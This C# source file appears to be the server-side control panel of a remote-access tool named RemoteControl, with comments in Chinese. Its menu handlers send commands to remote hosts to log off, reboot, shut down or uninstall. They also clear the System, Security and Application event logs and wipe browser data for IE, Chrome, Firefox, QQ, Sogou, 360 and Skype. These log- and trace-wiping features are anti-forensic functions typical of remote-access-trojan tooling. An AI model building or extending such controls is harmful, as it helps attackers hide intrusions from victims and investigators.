using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;
namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private void onMenuLogoff(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_LOGOFF_REQUEST, null);
        }

        private void onMenuReboot(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_REBOOT_REQUEST, null);
        }

        private void onMenuShutdown(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_SHUTDOWN_REQUEST, null);
        }

        private void onMenuUninstall(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            if (MessageBox.Show("确定要卸载该主机？", "确认", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                currentSession.Send(ePacketType.PACKET_UNINSTALL_REQUEST, new RequestUninstall());
            }
        }

        // ---- 清理日志 事件处理 ----
        private void onMenuClearAllLogs(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_LOG_REQUEST, new RequestClearLog { LogType = eClearLogType.All });
        }

        private void onMenuClearSystemLog(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_LOG_REQUEST, new RequestClearLog { LogType = eClearLogType.System });
        }

        private void onMenuClearSecurityLog(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_LOG_REQUEST, new RequestClearLog { LogType = eClearLogType.Security });
        }

        private void onMenuClearApplicationLog(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_LOG_REQUEST, new RequestClearLog { LogType = eClearLogType.Application });
        }

        // ---- 更改分组 ----
        private void onMenuChangeGroup(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            FrmRename frm = new FrmRename("");
            frm.Text = "更改分组";
            if (frm.ShowDialog() == DialogResult.OK)
            {
                // 更新树节点分组标签
                foreach (TreeNode node in InternetTreeNode.Nodes)
                {
                    var session = node.Tag as SocketSession;
                    if (session != null && session.SocketId == currentSession.SocketId)
                    {
                        node.ToolTipText = "分组: " + frm.NewName;
                        break;
                    }
                }
                doOutput("已更改分组为: " + frm.NewName);
            }
        }

        private void onMenuFilterHosts(object sender, EventArgs e)
        {
            FrmInputUrl frm = new FrmInputUrl();
            frm.Text = "请输入筛选关键词";
            if (frm.ShowDialog() != DialogResult.OK)
                return;

            hostFilterKeyword = string.IsNullOrWhiteSpace(frm.InputText)
                ? string.Empty
                : frm.InputText.Trim();
            RenderClientTree();
            doOutput(string.IsNullOrEmpty(hostFilterKeyword)
                ? "已清除主机筛选"
                : "已筛选主机: " + hostFilterKeyword);
        }

        // ---- 清除浏览器 事件处理 ----
        private void onMenuClearIE(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.IE });
        }

        private void onMenuClearChrome(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.Chrome });
        }

        private void onMenuClearSkype(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.Skype });
        }

        private void onMenuClearFirefox(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.Firefox });
        }

        private void onMenuClear360(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.Browser360 });
        }

        private void onMenuClearQQ(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.QQ });
        }

        private void onMenuClearSogou(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            currentSession.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_REQUEST, new RequestClearBrowserData { BrowserType = eBrowserType.Sogou });
        }

        // ---- 选择操作 ----
        private void onMenuSelectAll(object sender, EventArgs e)
        {
            foreach (TreeNode node in InternetTreeNode.Nodes)
            {
                node.Checked = true;
            }
        }

        private void onMenuDeselectAll(object sender, EventArgs e)
        {
            foreach (TreeNode node in InternetTreeNode.Nodes)
            {
                node.Checked = false;
            }
        }

    }
}
